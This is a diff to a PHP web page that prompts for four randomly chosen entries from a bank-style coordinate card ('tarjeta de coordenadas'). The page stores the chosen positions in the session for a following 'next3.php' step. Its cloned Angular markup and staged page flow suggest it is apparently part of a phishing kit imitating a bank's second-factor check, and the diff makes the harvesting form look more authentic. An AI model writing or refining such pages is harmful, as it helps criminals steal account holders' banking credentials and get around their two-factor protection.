@@ -1,3 +1,17 @@
+<?php
+session_start();
+
+// Generar 4 números aleatorios del 21 al 40 sin repetir
+$numeros = range(21, 40);
+shuffle($numeros);
+$pos1 = str_pad($numeros[0], 2, '0', STR_PAD_LEFT);
+$pos2 = str_pad($numeros[1], 2, '0', STR_PAD_LEFT);
+$pos3 = str_pad($numeros[2], 2, '0', STR_PAD_LEFT);
+$pos4 = str_pad($numeros[3], 2, '0', STR_PAD_LEFT);
+
+// Guardar en sesión para next3.php
+$_SESSION['coordenadas_2'] = [$pos1, $pos2, $pos3, $pos4];
+?>
 <html lang="en">
 <head>
 <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
@@ -63,36 +77,36 @@ width: 100vw !important;
 <table width="0" border="0" cellspacing="0" cellpadding="0">
   <tr>
     <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">31</div></td>
+    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos1; ?></div></td>
     <td width="10">&nbsp;</td>
-    <td width="155"><input type="text" name="co1" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
+    <td width="155"><input type="text" name="co1" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
   </tr>
 </table>
 <br>
 <table width="0" border="0" cellspacing="0" cellpadding="0">
   <tr>
     <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">20</div></td>
+    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos2; ?></div></td>
     <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co2" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
+    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co2" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
   </tr>
 </table>
 <br>
 <table width="0" border="0" cellspacing="0" cellpadding="0">
   <tr>
     <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">14</div></td>
+    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos3; ?></div></td>
     <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co3" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
+    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co3" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
   </tr>
 </table>
 <br>
 <table width="0" border="0" cellspacing="0" cellpadding="0">
   <tr>
     <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">5</div></td>
+    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos4; ?></div></td>
     <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co4" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
+    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co4" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
   </tr>
 </table>
 <label _ngcontent-otb-c140="" for="userName"></label>
@@ -101,11 +115,6 @@ width: 100vw !important;
 
 
 </div>
-
-
-
-
-
 
 <div _ngcontent-otb-c140="" class="p-field p-col-10 p-mb-2" style="display: none;">
 <div _ngcontent-otb-c140="" class="p-d-flex">
